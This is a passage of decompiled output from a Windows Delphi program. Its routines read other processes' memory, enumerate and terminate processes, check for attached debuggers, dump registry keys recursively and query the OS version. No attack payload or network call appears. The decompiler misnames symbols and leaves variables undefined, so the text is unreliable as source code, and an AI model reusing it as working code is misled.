  unsigned __int16 v8; // [esp+18h] [ebp-20h] BYREF
  LPCVOID v9; // [esp+1Ch] [ebp-1Ch]
  DWORD NumberOfBytesRead; // [esp+20h] [ebp-18h] BYREF
  int Buffer; // [esp+24h] [ebp-14h] BYREF
  LPCVOID lpBaseAddress; // [esp+28h] [ebp-10h]
  int v13; // [esp+2Ch] [ebp-Ch]
  int *v14; // [esp+30h] [ebp-8h]
  HANDLE hProcess; // [esp+34h] [ebp-4h]

  v14 = a2;
  hProcess = a1;
  sub_406C44(a2);
  result = off_468134;
  if ( *off_468134 )
  {
    Guitesting::TGUITestCase::Hide(v6, 24);
    result = (int *)((int (__stdcall *)(HANDLE, _DWORD, char *, int, _DWORD))*off_468134)(hProcess, 0, v6, 24, 0);
    if ( !result )
    {
      v13 = v7;
      lpBaseAddress = (LPCVOID)(v7 + 16);
      NumberOfBytesRead = 0;
      result = (int *)ReadProcessMemory(hProcess, (LPCVOID)(v7 + 16), &Buffer, 4u, &NumberOfBytesRead);
      if ( result )
      {
        NumberOfBytesRead = 0;
        result = (int *)ReadProcessMemory(hProcess, lpBaseAddress, &Buffer, 4u, &NumberOfBytesRead);
        if ( result )
        {
          lpBaseAddress = (LPCVOID)(Buffer + 64);
          NumberOfBytesRead = 0;
          result = (int *)ReadProcessMemory(hProcess, (LPCVOID)(Buffer + 64), &v8, 8u, &NumberOfBytesRead);
          if ( result )
          {
            sub_407890(v14, v8 >> 1, v3);
            if ( v8 )
            {
              NumberOfBytesRead = 0;
              v5 = v8;
              v4 = (void *)sub_4071C0(v14);
              if ( !ReadProcessMemory(hProcess, v9, v4, v5, &NumberOfBytesRead) )
                sub_406C44(v14);
            }
            return sub_424610(v14);
          }
        }
      }
    }
  }
  return result;
}
// 44BA85: variable 'v3' is possibly undefined
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 468134: using guessed type int *off_468134;
// 44B9B0: using guessed type char var_38[4];

//----- (0044BAD0) --------------------------------------------------------
HANDLE __fastcall sub_44BAD0(int a1, int a2, BOOL a3, DWORD dwProcessId)
{
  int i; // ebx
  int v5; // esi
  int v7; // [esp-4h] [ebp-24h] BYREF
  int v8; // [esp+8h] [ebp-18h]
  int v9; // [esp+Ch] [ebp-14h]
  HANDLE v10; // [esp+10h] [ebp-10h]
  BOOL bInheritHandle; // [esp+14h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-8h]
  int *v13; // [esp+1Ch] [ebp-4h]

  for ( i = a2; i >= 0; v7 = v5 )
    v5 = *(_DWORD *)(a1 + 4 * i--);
  bInheritHandle = a3;
  v12 = a2;
  v13 = &v7;
  v10 = 0;
  if ( a2 >= 0 )
  {
    v8 = a2 + 1;
    v9 = 0;
    do
    {
      v10 = OpenProcess(v13[v9], bInheritHandle, dwProcessId);
      if ( v10 )
        break;
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  return v10;
}

//----- (0044BB40) --------------------------------------------------------
char __usercall sub_44BB40@<al>(DWORD a1@<eax>, int a2@<edi>, int a3@<esi>, long double a4@<st0>)
{
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v9; // [esp-28h] [ebp-88h]
  int v10; // [esp-20h] [ebp-80h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-78h] BYREF
  void *v12; // [esp-14h] [ebp-74h]
  int *v13; // [esp-10h] [ebp-70h]
  unsigned int v14[2]; // [esp-Ch] [ebp-6Ch] BYREF
  int *v15; // [esp-4h] [ebp-64h]
  void *v16; // [esp+0h] [ebp-60h] BYREF
  int v17; // [esp+4h] [ebp-5Ch] BYREF
  void *v18; // [esp+8h] [ebp-58h] BYREF
  int v19; // [esp+Ch] [ebp-54h] BYREF
  void *v20; // [esp+10h] [ebp-50h] BYREF
  int v21; // [esp+14h] [ebp-4Ch] BYREF
  void *v22; // [esp+18h] [ebp-48h] BYREF
  int v23; // [esp+1Ch] [ebp-44h] BYREF
  void *v24; // [esp+20h] [ebp-40h] BYREF
  int v25; // [esp+24h] [ebp-3Ch] BYREF
  int v26; // [esp+28h] [ebp-38h] BYREF
  int v27; // [esp+2Ch] [ebp-34h] BYREF
  int v28; // [esp+30h] [ebp-30h] BYREF
  void *v29; // [esp+34h] [ebp-2Ch] BYREF
  int v30; // [esp+38h] [ebp-28h] BYREF
  void *v31; // [esp+3Ch] [ebp-24h] BYREF
  int v32; // [esp+40h] [ebp-20h] BYREF
  int v33; // [esp+44h] [ebp-1Ch]
  BOOL pbDebuggerPresent; // [esp+48h] [ebp-18h] BYREF
  DWORD ExitCode; // [esp+4Ch] [ebp-14h] BYREF
  HANDLE hObject; // [esp+50h] [ebp-10h]
  HANDLE hProcess; // [esp+54h] [ebp-Ch]
  char v38; // [esp+5Bh] [ebp-5h]
  DWORD dwProcessId; // [esp+5Ch] [ebp-4h]
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  dwProcessId = a1;
  v15 = &savedregs;
  v14[1] = (unsigned int)&loc_44BE79;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  v38 = 0;
  v33 = 1;
  while ( 1 )
  {
    hProcess = OpenProcess(1u, 0, dwProcessId);
    if ( !hProcess )
      break;
    hObject = sub_44BAD0((int)dword_44BF64, 1, 0, dwProcessId);
    v13 = &savedregs;
    v12 = &loc_44BE4A;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    ExitCode = 0;
    if ( GetExitCodeProcess(hProcess, &ExitCode) || hObject && GetExitCodeProcess(hObject, &ExitCode) )
    {
      if ( ExitCode != 259 )
      {
        sub_415178(&v27, 0, v5, dwProcessId);
        v10 = v27;
        sub_4154C8(8, &v26, ExitCode);
        v9 = v26;
        sub_4079F0(&v28, 4);
        sub_433BE0(*off_467F18, v28, (int)L"TerminateApp:");
        v38 = 1;
        System::__linkproc__ TryFinallyExit(v9, &off_44BFC8, v10);
        goto LABEL_23;
      }
    }
    else
    {
      sub_415178((int *)&v24, 0, v5, dwProcessId);
      sub_407968(&v25, L"GetExitCodeProcess PID=", v24);
      sub_433940(*off_467F18, (void *)v25, (int)L"TerminateApp:", a2, a3, a4, 0);
    }
    pbDebuggerPresent = 0;
    if ( CheckRemoteDebuggerPresent(hProcess, &pbDebuggerPresent)
      || hObject && CheckRemoteDebuggerPresent(hObject, &pbDebuggerPresent) )
    {
      if ( pbDebuggerPresent )
      {
        sub_415178((int *)&v22, 0, v6, dwProcessId);
        sub_407968(&v23, L"Process has debugger PID=", v22);
        sub_433460(*off_467F18, v23, (int)L"TerminateApp:");
      }
    }
    else
    {
      sub_415178((int *)&v20, 0, v6, dwProcessId);
      sub_407968(&v21, L"CheckRemoteDebuggerPresent PID=", v20);
      sub_433940(*off_467F18, (void *)v21, (int)L"TerminateApp:", a2, a3, a4, 0);
    }
    if ( TerminateProcess(hProcess, 0) )
    {
      sub_415178((int *)&v18, 0, v7, dwProcessId);
      sub_407968(&v19, L"Process terminated. PID=", v18);
      sub_433BE0(*off_467F18, v19, (int)L"TerminateApp:");
      v38 = 1;
      System::__linkproc__ TryFinallyExit(ExceptionList, v12, v13);
      goto LABEL_23;
    }
    sub_415178((int *)&v16, 0, v7, dwProcessId);
    sub_407968(&v17, L"Process termination failed. PID=", v16);
    sub_433940(*off_467F18, (void *)v17, (int)L"TerminateApp:", a2, a3, a4, 0);
    Sleep_0(400 * v33);
    __writefsdword(0, (unsigned int)ExceptionList);
    v13 = (int *)&loc_44BE51;
    CloseHandle_0(hProcess);
    if ( hObject )
      CloseHandle_0(hObject);
    if ( ++v33 == 4 )
      goto LABEL_23;
  }
  if ( v33 == 1 )
  {
    v13 = 0;
    sub_415178((int *)&v31, 0, v4, dwProcessId);
    sub_407968(&v32, L"OpenProcess failed. PID=", v31);
    sub_433940(*off_467F18, (void *)v32, (int)L"TerminateApp:", a2, a3, a4, (char)v13);
  }
  else
  {
    sub_415178((int *)&v29, 0, v4, dwProcessId);
    sub_407968(&v30, L"Unable to open process handle on > 1 iteration PID=", v29);
    sub_433BE0(*off_467F18, v30, (int)L"TerminateApp:");
    v38 = 1;
  }
LABEL_23:
  __writefsdword(0, v14[0]);
  v15 = (int *)&loc_44BE80;
  sub_406CA4((int)&v16, 17);
  return v38;
}
// 44BB93: variable 'v4' is possibly undefined
// 44BC70: variable 'v5' is possibly undefined
// 44BD35: variable 'v6' is possibly undefined
// 44BDAE: variable 'v7' is possibly undefined
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 44BE94: using guessed type wchar_t aOpenprocessFai[25];
// 44BED4: using guessed type wchar_t aTerminateapp[14];
// 44BEFC: using guessed type wchar_t aUnableToOpenPr[52];
// 44BF64: using guessed type int dword_44BF64[5];
// 44BFC8: using guessed type void *off_44BFC8;
// 44BFEC: using guessed type wchar_t aGetexitcodepro[24];
// 44C028: using guessed type wchar_t aProcessHasDebu[26];
// 44C068: using guessed type wchar_t aCheckremotedeb[32];
// 44C0B4: using guessed type wchar_t aProcessTermina[25];
// 44C0F4: using guessed type wchar_t aProcessTermina_0[33];
// 467F18: using guessed type int *off_467F18;

//----- (0044C140) --------------------------------------------------------
_DWORD *__fastcall sub_44C140(char a1, char a2, _DWORD *a3)
{
  unsigned int v4[2]; // [esp-24h] [ebp-278h] BYREF
  int *v5; // [esp-1Ch] [ebp-270h]
  unsigned int v6[2]; // [esp-18h] [ebp-26Ch] BYREF
  int *v7; // [esp-10h] [ebp-264h]
  unsigned int v8[2]; // [esp-Ch] [ebp-260h] BYREF
  int *v9; // [esp-4h] [ebp-258h]
  int v10; // [esp+4h] [ebp-250h] BYREF
  int v11; // [esp+8h] [ebp-24Ch] BYREF
  PROCESSENTRY32W pe; // [esp+Ch] [ebp-248h] BYREF
  int v13; // [esp+238h] [ebp-1Ch] BYREF
  int v14; // [esp+23Ch] [ebp-18h]
  bool i; // [esp+243h] [ebp-11h]
  HANDLE hObject; // [esp+244h] [ebp-10h]
  HANDLE hSnapshot; // [esp+248h] [ebp-Ch]
  _DWORD *v18; // [esp+24Ch] [ebp-8h]
  char v19; // [esp+252h] [ebp-2h]
  char v20; // [esp+253h] [ebp-1h]
  int savedregs; // [esp+254h] [ebp+0h] BYREF

  v10 = 0;
  v11 = 0;
  v13 = 0;
  v18 = a3;
  v19 = a2;
  v20 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_44C3B1;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_408B34(a3, (int)&byte_44ADC4);
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( hSnapshot != (HANDLE)-1 )
  {
    v14 = 0;
    v7 = &savedregs;
    v6[1] = (unsigned int)&loc_44C384;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    Guitesting::TGUITestCase::Hide(&pe, 556);
    pe.dwSize = 556;
    for ( i = Process32FirstW(hSnapshot, &pe); i; i = Process32NextW(hSnapshot, &pe) )
    {
      if ( pe.th32ProcessID )
      {
        hObject = sub_44BAD0((int)dword_44C3C0, 3, 0, pe.th32ProcessID);
        if ( hObject )
        {
          v5 = &savedregs;
          v4[1] = (unsigned int)&loc_44C343;
          v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)v4);
          sub_44B890((int)hObject, 0, &v13);
          if ( v13 )
          {
            System::__linkproc__ DynArraySetLength(v14 + 1);
            sub_406FE8((volatile __int32 *)(*v18 + 20 * v14 + 8), v13);
            *(_DWORD *)(*v18 + 20 * v14) = pe.th32ProcessID;
            *(_DWORD *)(*v18 + 20 * v14 + 4) = pe.th32ParentProcessID;
            if ( v20 )
            {
              sub_44AFA0(*(_DWORD *)(*v18 + 20 * v14 + 8), 0, &v11);
              sub_406FE8((volatile __int32 *)(*v18 + 20 * v14 + 12), v11);
            }
            else
            {
              sub_406C44((_DWORD *)(*v18 + 20 * v14 + 12));
            }
            if ( v19 )
            {
              sub_44B9B0(hObject, &v10);
              sub_406FE8((volatile __int32 *)(*v18 + 20 * v14 + 16), v10);
            }
            else
            {
              sub_406C44((_DWORD *)(*v18 + 20 * v14 + 16));
            }
            ++v14;
          }
          __writefsdword(0, v4[0]);
          v5 = (int *)&loc_44C34A;
          CloseHandle_0(hObject);
        }
      }
    }
    __writefsdword(0, v6[0]);
    v7 = (int *)&loc_44C38B;
    CloseHandle_0(hSnapshot);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_44C3B8;
  sub_406CA4((int)&v10, 2);
  return sub_406C44(&v13);
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 44ADC4: using guessed type char byte_44ADC4;
// 44C3C0: using guessed type int dword_44C3C0[4];

//----- (0044C3D0) --------------------------------------------------------
char __fastcall sub_44C3D0(_DWORD *a1)
{
  volatile __int32 *v1; // eax
  _DWORD *v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  bool v6; // al
  _DWORD *v8; // [esp-24h] [ebp-16Ch]
  volatile __int32 *v9; // [esp-20h] [ebp-168h]
  volatile __int32 *v10; // [esp-1Ch] [ebp-164h]
  unsigned int v11[3]; // [esp-18h] [ebp-160h] BYREF
  unsigned int v12[2]; // [esp-Ch] [ebp-154h] BYREF
  int *v13; // [esp-4h] [ebp-14Ch]
  struct _OSVERSIONINFOW v14; // [esp+Ch] [ebp-13Ch] BYREF
  const int *v15; // [esp+12Ch] [ebp-1Ch] BYREF
  int v16; // [esp+130h] [ebp-18h] BYREF
  int v17; // [esp+134h] [ebp-14h] BYREF
  int v18; // [esp+138h] [ebp-10h] BYREF
  int v19; // [esp+13Ch] [ebp-Ch] BYREF
  bool v20; // [esp+143h] [ebp-5h]
  _DWORD *v21; // [esp+144h] [ebp-4h]
  int savedregs; // [esp+148h] [ebp+0h] BYREF

  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = 0;
  v21 = a1;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_44C567;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v20 = 0;
  v11[2] = (unsigned int)&savedregs;
  v11[1] = (unsigned int)&loc_44C512;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  Guitesting::TGUITestCase::Hide(a1, 12);
  sub_425F40(&v14);
  if ( v14.dwMajorVersion )
  {
    v10 = sub_406C44(&v17);
    v9 = sub_406C44(&v16);
    v8 = sub_406C44(&v18);
    v1 = sub_406C44(&v19);
    if ( sub_449880((__int32)L"kernel32.dll", v1, (__int32)v8, v10, v9) )
    {
      v2 = sub_408B34(&v15, (int)&byte_4224D0);
      sub_424750(v19, (int)&str___3[1], v2);
      if ( System::__linkproc__ LStrLen(v15) >= 2 )
      {
        v3 = Sysutils::StrToIntDef(*v15, 0);
        *v21 = v3;
        v4 = Sysutils::StrToIntDef(v15[1], 0);
        v21[1] = v4;
        if ( System::__linkproc__ LStrLen(v15) >= 3 )
        {
          v5 = Sysutils::StrToIntDef(v15[2], 0);
          v21[2] = v5;
        }
      }
      v6 = *v21 != v14.dwMajorVersion || v21[1] != v14.dwMinorVersion;
      v20 = v6;
    }
  }
  __writefsdword(0, v11[0]);
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_44C56E;
  sub_408B34(&v15, (int)&byte_4224D0);
  sub_406CA4((int)&v16, 4);
  return v20;
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4224D0: using guessed type char byte_4224D0;
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 44C584: using guessed type wchar_t aKernel32Dll_4[13];
// 44C5A4: using guessed type _strings str___3[1];
// 44C3D0: using guessed type int var_C;

//----- (0044C5B0) --------------------------------------------------------
int __usercall sub_44C5B0@<eax>(HKEY a1@<eax>, void *a2@<edx>, __int32 a3@<ecx>, int a4@<edi>)
{
  int v4; // eax
  int v6; // [esp-44h] [ebp-98h]
  void *v7; // [esp-3Ch] [ebp-90h]
  int v8; // [esp-38h] [ebp-8Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-30h] [ebp-84h] BYREF
  void *v10; // [esp-2Ch] [ebp-80h]
  int *v11; // [esp-28h] [ebp-7Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-24h] [ebp-78h] BYREF
  void *v13; // [esp-20h] [ebp-74h]
  int *v14; // [esp-1Ch] [ebp-70h]
  _DWORD v15[3]; // [esp-18h] [ebp-6Ch] BYREF
  _DWORD v16[4]; // [esp-Ch] [ebp-60h] BYREF
  int v17; // [esp+4h] [ebp-50h] BYREF
  int v18; // [esp+8h] [ebp-4Ch] BYREF
  int v19; // [esp+Ch] [ebp-48h] BYREF
  int v20; // [esp+10h] [ebp-44h] BYREF
  int v21; // [esp+14h] [ebp-40h] BYREF
  int v22; // [esp+18h] [ebp-3Ch] BYREF
  int v23; // [esp+1Ch] [ebp-38h] BYREF
  int v24; // [esp+20h] [ebp-34h] BYREF
  int v25; // [esp+24h] [ebp-30h]
  int System__AnsiString; // [esp+28h] [ebp-2Ch]
  int v27; // [esp+2Ch] [ebp-28h] BYREF
  void *v28; // [esp+30h] [ebp-24h] BYREF
  int v29; // [esp+34h] [ebp-20h] BYREF
  char v30[8]; // [esp+38h] [ebp-1Ch] BYREF
  Idthreadcomponent::TIdThreadComponent *v31; // [esp+40h] [ebp-14h]
  int v32; // [esp+44h] [ebp-10h]
  int v33; // [esp+48h] [ebp-Ch]
  void *v34; // [esp+4Ch] [ebp-8h]
  HKEY v35; // [esp+50h] [ebp-4h] BYREF
  int savedregs; // [esp+54h] [ebp+0h] BYREF

  v33 = _InterlockedExchange((volatile __int32 *)&v35, a3);
  v34 = a2;
  v35 = a1;
  v16[2] = &savedregs;
  v16[1] = &loc_44C9CF;
  v16[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v16);
  v31 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  v15[2] = &savedregs;
  v15[1] = &loc_44C9A0;
  v15[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v32 = sub_441F30((int)&cls_RegistryUtil_TUnicodeRegistry, 1, 131097, 0);
  v14 = &savedregs;
  v13 = &loc_44C983;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_442980(v32, v35);
  if ( sub_4424B0((_DWORD *)v32, (__int32)v34, 0) )
  {
    v11 = &savedregs;
    v10 = &loc_44C8E2;
    v9 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v9);
    if ( v35 == HKEY_CLASSES_ROOT )
    {
      sub_407030(&v29, (__int32)L"HKEY_CLASSES_ROOT");
    }
    else if ( v35 == HKEY_CURRENT_USER )
    {
      sub_407030(&v29, (__int32)L"HKEY_CURRENT_USER");
    }
    else if ( v35 == HKEY_LOCAL_MACHINE )
    {
      sub_407030(&v29, (__int32)L"HKEY_LOCAL_MACHINE");
    }
    else if ( v35 == HKEY_USERS )
    {
      sub_407030(&v29, (__int32)L"HKEY_USERS");
    }
    else if ( v35 == HKEY_PERFORMANCE_DATA )
    {
      sub_407030(&v29, (__int32)L"HKEY_PERFORMANCE_DATA");
    }
    else if ( v35 == HKEY_CURRENT_CONFIG )
    {
      sub_407030(&v29, (__int32)L"HKEY_CURRENT_CONFIG");
    }
    else if ( v35 == HKEY_DYN_DATA )
    {
      sub_407030(&v29, (__int32)L"HKEY_DYN_DATA");
    }
    else
    {
      sub_4154C8(8, &v29, (unsigned int)v35);
    }
    v8 = v29;
    sub_4079F0(&v24, 5);
    Guitesting::TGUITestCase::Hide(v33, v24);
    sub_442A80(v32, v31, a4);
    if ( *((_DWORD *)v31 + 2) - 1 >= 0 )
    {
      v25 = *((_DWORD *)v31 + 2);
      System__AnsiString = 0;
      while ( 1 )
      {
        sub_428E60(v31, System__AnsiString, &v29);
        if ( v29 )
          sub_4079F0((int *)&v28, 3);
        else
          sub_407030((volatile __int32 *)&v28, (__int32)dword_44CB64);
        if ( (unsigned __int8)sub_442250(v32, v29, (int)v30) )
          break;
        sub_407968(&v19, L"; Unable to get info: ", v28);
        Guitesting::TGUITestCase::Hide(v33, v19);
LABEL_35:
        ++System__AnsiString;
        if ( !--v25 )
          goto LABEL_36;
      }
      sub_406C44(&v27);
      if ( !v30[0] )
        goto LABEL_30;
      if ( (unsigned __int8)(v30[0] - 1) < 2u )
      {
        sub_4428D0(v32, v29, &v23);
        sub_4079F0(&v27, 4);
        goto LABEL_31;
      }
      if ( v30[0] == 3 )
      {
        v4 = sub_442850(v32, v29);
        sub_4154B0(v4, 8, &v22);
        sub_4079F0(&v27, 3);
        goto LABEL_31;
      }
      if ( v30[0] == 4 )
      {
LABEL_30:
        sub_442B90(v32, v29, 1, &v21);
        sub_4079F0(&v27, 3);
      }
LABEL_31:
      if ( v27 )
      {
        Guitesting::TGUITestCase::Hide(v33, v27);
      }
      else
      {
        sub_407968(&v20, L"; Unable to get: ", v28);
        Guitesting::TGUITestCase::Hide(v33, v20);
      }
      goto LABEL_35;
    }
LABEL_36:
    Guitesting::TGUITestCase::Hide(v33, 0);
    (*(void (__fastcall **)(Idthreadcomponent::TIdThreadComponent *))(*(_DWORD *)v31 + 4))(v31);
    sub_4429B0(v32, v31, a4);
    __writefsdword(0, (unsigned int)dword_44CB54);
    sub_441EF0(v32);
    if ( *((_DWORD *)v31 + 2) - 1 >= 0 )
    {
      v25 = *((_DWORD *)v31 + 2);
      System__AnsiString = 0;
      do
      {
        sub_428E60(v31, System__AnsiString, &v29);
        if ( v29 )
        {
          v7 = v34;
          v6 = v29;
          sub_4079F0(&v18, 3);
          sub_44C5B0(v35, v18, v33, v7, dword_44CB44, v6);
        }
        else
        {
          Guitesting::TGUITestCase::Hide(v33, L"; Empty key");
        }
        ++System__AnsiString;
        --v25;
      }
      while ( v25 );
    }
  }
  else
  {
    sub_407968(&v17, L"; Unable to open: ", v34);
    Guitesting::TGUITestCase::Hide(v33, v17);
  }
  __writefsdword(0, v8);
  v9 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_44C98A;
  sub_405598((_DWORD *)v32);
  __writefsdword(0, (unsigned int)v10);
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_44C9A7;
  sub_405598(v31);
  __writefsdword(0, (unsigned int)v13);
  v15[0] = &loc_44C9D6;
  sub_406CA4((int)&v17, 8);
  return sub_406CA4((int)&v27, 3);
}
// 44C972: variable 'v8' is possibly undefined
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 429130: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 441D10: using guessed type __int16 cls_RegistryUtil_TUnicodeRegistry;
// 44C9E8: using guessed type wchar_t aHkeyClassesRoo[18];
// 44CA18: using guessed type wchar_t aHkeyCurrentUse[18];
// 44CA48: using guessed type wchar_t aHkeyLocalMachi[19];
// 44CA7C: using guessed type wchar_t aHkeyUsers[11];
// 44CAA0: using guessed type wchar_t aHkeyPerformanc[22];
// 44CAD8: using guessed type wchar_t aHkeyCurrentCon[20];
// 44CB0C: using guessed type wchar_t aHkeyDynData[14];
// 44CB44: using guessed type int dword_44CB44[4];
// 44CB54: using guessed type int dword_44CB54[4];
// 44CB64: using guessed type int dword_44CB64[4];
// 44CBC4: using guessed type wchar_t aUnableToGet[18];
// 44CBF4: using guessed type wchar_t aUnableToGetInf[23];
// 44CC30: using guessed type wchar_t aEmptyKey[12];
// 44CC54: using guessed type wchar_t aUnableToOpen[19];
// 44C5B0: using guessed type char var_1C[8];

//----- (0044CCB0) --------------------------------------------------------
int __fastcall sub_44CCB0(_DWORD *a1)
{
  int v1; // ecx
  int v2; // ecx
  int v3; // ecx
  int v4; // ecx
  wchar_t *v6; // [esp-60h] [ebp-1B0h]
  unsigned int v7[3]; // [esp-18h] [ebp-168h] BYREF
  unsigned int v8[2]; // [esp-Ch] [ebp-15Ch] BYREF
  int *v9; // [esp-4h] [ebp-154h]
  int v10; // [esp+Ch] [ebp-144h] BYREF
  int v11; // [esp+10h] [ebp-140h] BYREF
  int v12; // [esp+14h] [ebp-13Ch] BYREF
  int v13; // [esp+18h] [ebp-138h] BYREF
  int v14; // [esp+1Ch] [ebp-134h] BYREF
  int v15; // [esp+20h] [ebp-130h] BYREF
  int v16; // [esp+24h] [ebp-12Ch] BYREF
  struct _OSVERSIONINFOW v17; // [esp+28h] [ebp-128h] BYREF
  unsigned __int16 v18; // [esp+13Ch] [ebp-14h]
  unsigned __int16 v19; // [esp+13Eh] [ebp-12h]
  unsigned __int8 v20; // [esp+142h] [ebp-Eh]
  int v21; // [esp+148h] [ebp-8h]
  int v22; // [esp+14Ch] [ebp-4h]
  int savedregs; // [esp+150h] [ebp+0h] BYREF

  v10 = 0;
  v16 = 0;
  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v22 = (int)a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_44CEC9;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_406C44(a1);
  v7[2] = (unsigned int)&savedregs;
  v7[1] = (unsigned int)&loc_44CE7F;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_425F40(&v17);
  if ( v17.dwMajorVersion )
  {
    sub_415178(&v16, 0, v1, v17.dwMajorVersion);
    sub_415178(&v15, 0, v2, v17.dwMinorVersion);
    sub_415150(v18, &v14);
    sub_415150(v19, &v13);
    sub_415178(&v12, 0, v3, v17.dwBuildNumber);
    sub_415150(v20, &v11);
    sub_4079F0((int *)v22, 12);
    v21 = sub_425F60();
    if ( v21 )
    {
      sub_415178(&v10, 0, v4, (unsigned int)v21);
      sub_4079F0((int *)v22, 3);
    }
    v6 = (&off_467CCC)[sub_425F20() & 0x7F];
    sub_4079F0((int *)v22, 3);
    if ( (unsigned __int8)sub_425F00() )
      sub_407910((volatile __int32 *)v22, L" server");
    __writefsdword(0, (unsigned int)v6);
  }
  else
  {
    sub_406FE8((volatile __int32 *)v22, (int)L"Unknown Windows OS");
    __writefsdword(0, v7[0]);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_44CED0;
  return sub_406CA4((int)&v10, 7);
}
// 44CD52: variable 'v1' is possibly undefined
// 44CD72: variable 'v2' is possibly undefined
// 44CDC6: variable 'v3' is possibly undefined
// 44CE1E: variable 'v4' is possibly undefined
// 44CEE4: using guessed type wchar_t aUnknownWindows[19];
// 44CF30: using guessed type _strings str___4[1];
// 44CF90: using guessed type _strings str___16[1];
// 44CFA8: using guessed type wchar_t aServer[8];
// 467CCC: using guessed type wchar_t *off_467CCC;

//----- (0044CFE0) --------------------------------------------------------
char __usercall sub_44CFE0@<al>(
        void *a1@<eax>,
        int a2@<edx>,
        char a3@<cl>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>)
{
  int InBuffer[5]; // [esp+0h] [ebp-24h] BYREF
  DWORD BytesReturned; // [esp+14h] [ebp-10h] BYREF
  char v9; // [esp+1Ah] [ebp-Ah]
  char v10; // [esp+1Bh] [ebp-9h]
  int v11; // [esp+1Ch] [ebp-8h]
  HANDLE hDevice; // [esp+20h] [ebp-4h]

  v10 = a3;
  v11 = a2;
  hDevice = a1;
  v9 = 0;
  Guitesting::TGUITestCase::Hide(InBuffer, 20);
  InBuffer[0] = 1;
  InBuffer[1] = 2;
  InBuffer[2] = 1;
  InBuffer[3] = v11;
  BytesReturned = 0;
  if ( DeviceIoControl(hDevice, 0x9030Cu, InBuffer, 0x14u, 0, 0, &BytesReturned, 0) )
    return 1;
  if ( !v10 )
    sub_433940(*off_467F18, L"DeviceIoControl FSCTL_SET_EXTERNAL_BACKING", 0, a4, a5, a6, 0);
  return v9;
}
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 44D078: using guessed type wchar_t aDeviceiocontro[43];
// 467F18: using guessed type int *off_467F18;

//----- (0044D0D0) --------------------------------------------------------
_DWORD *__fastcall sub_44D0D0(int a1, void *a2, char a3, _DWORD *a4, volatile __int32 *a5)
{
  volatile __int32 *v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  void *v9; // [esp+4h] [ebp-10h] BYREF
  char v10; // [esp+Bh] [ebp-9h]
  void *v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9 = 0;
  v10 = a3;
  v11 = a2;
  v12 = a1;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_44D14D;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_441BC0(a1, a2, a5);
  v5 = a5;
  if ( !*a5 )
  {
    LOBYTE(v5) = v10;
    sub_44D160(v5, a5);
    if ( *a5 )
    {
